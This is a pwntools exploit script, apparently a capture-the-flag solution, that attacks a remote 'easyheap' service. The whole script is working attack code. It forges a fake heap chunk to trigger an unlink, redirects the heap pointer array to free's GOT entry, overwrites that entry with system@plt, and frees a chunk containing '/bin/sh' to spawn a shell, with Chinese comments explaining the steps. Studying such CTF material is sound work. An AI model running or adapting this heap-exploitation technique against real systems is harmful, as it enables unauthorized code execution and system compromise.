from pwn import *

context(os='linux', arch='amd64', log_level='debug')
io = remote('redirect.do-not-trust.hacking.run', 10428)
e = ELF('./easyheap')

def create(size,content):
    io.sendlineafter(b'Your choice :', b'1')
    io.recvuntil('Size of Heap : ')
    io.sendline(str(size))
    io.recvuntil('Content of heap:')
    io.sendline(content)

def edit(index, size, content):
    io.sendlineafter(b'Your choice :', b'2')
    io.recvuntil('Index :')
    io.sendline(str(index))
    io.recvuntil('Size of Heap : ')
    io.sendline(str(size))
    io.recvuntil('Content of heap : ')
    io.sendline(content)

def delete(index):
    io.sendlineafter(b'Your choice :', b'3')
    io.recvuntil('Index :')
    io.sendline(str(index))

heaparray_creater = 0x6020E0
system_plt = e.plt['system']
free_got = e.got['free']

# 先创建3个chunk
create(0x90,b'aaaa') #chunk0
create(0x90,b'bbbb') #chunk1
create(0x20,b'/bin/sh\x00') #chunk2

# 编辑chunk0 构造出一个fake_chunk, 用于在释放chunk1时方便chunk1和fake_chunk进行合并
fake_chunk = p64(0) + p64(0x91) + p64(heaparray_creater-0x18) + p64(heaparray_creater-0x10)
fake_chunk = fake_chunk.ljust(0x90, b'a')
fake_chunk += p64(0x90) + p64(0xa0)
edit(0,0x100,fake_chunk)
delete(1)
payload = p64(0)*3 +p64(free_got)
edit(0,0x20 ,payload)
# 将free_got修改成system_plt, 这样在执行delete()时真正执行的就是system()
edit(0,8,p64(system_plt))
delete(2)

io.interactive()